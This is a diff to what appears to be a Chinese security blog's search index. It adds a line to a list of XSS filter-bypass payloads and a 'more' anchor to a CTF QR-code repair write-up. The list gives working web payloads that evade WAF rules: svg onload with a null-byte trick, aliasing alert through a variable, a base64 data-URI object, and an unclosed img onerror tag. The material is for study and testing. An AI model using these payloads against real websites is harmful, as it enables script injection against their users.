@@ -558,6 +558,7 @@
 <li>匹配<code>&lt;&gt;</code>中间不能有<code>=onload</code>等任意javascript事件，内容只匹配一次，第一个<code>&lt;</code>与<code>%3e</code>匹配了，第二个<code>&lt;</code>与最后的<code>&gt;</code>匹配了，所以第一个<code>&lt;</code>与最后的<code>&gt;</code>中间的<code>onload=</code>没有被拦截<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg admin=<span class="string">&#x27;&lt;%00%3e&#x27;</span> onload=alert<span class="string">`xss`</span>&gt;</span><br></pre></td></tr></table></figure></li>
 <li>js关键字拼接绕过，把alert函数赋值到变量，通过变量调用，可绕过函数名的拦截<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ex1:</span><br><span class="line">&lt;svg onload=<span class="string">&quot;var a=alert;console.log(a(1))&quot;</span>&gt;&lt;/svg&gt;</span><br><span class="line">ex2:</span><br><span class="line"><span class="number">11111111</span><span class="string">&quot;&gt;&lt;svg+onload=&quot;</span><span class="keyword">var</span>+a=alert;a(<span class="number">1</span>)<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure></li>
 <li>无事件和js代码xss<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>不闭合标签，利用了浏览器自动补全标签的特性xss<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img+src=1+onerror%3Dalert(1)+aaa</span></span></span><br></pre></td></tr></table></figure></li>
 </ol>
 ]]></content>
       <categories>
@@ -930,6 +931,7 @@ st->op1->op2->e</textarea><textarea id="flowchart-2-options" style="display: non
     <url>/2020/11/17/give-you-flag-writeup/</url>
     <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>本题来源于攻防世界，MISC题，题目考察的是二维码修复能力。</p>
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>题目是一张GIF图片，使用图像软件逐帧查看可发现里面有个二维码，我这里使用的是<code>ImageGlass</code>，免费软件。</p>
+<a id="more"></a>
 <p><img data-src="/2020/11/17/give-you-flag-writeup/image-20201117154637142.png"></p>
 <p>使用<code>ImageGlass</code>提取所有帧：</p>
 <p><img data-src="/2020/11/17/give-you-flag-writeup/image-20201117155032363.png"></p>
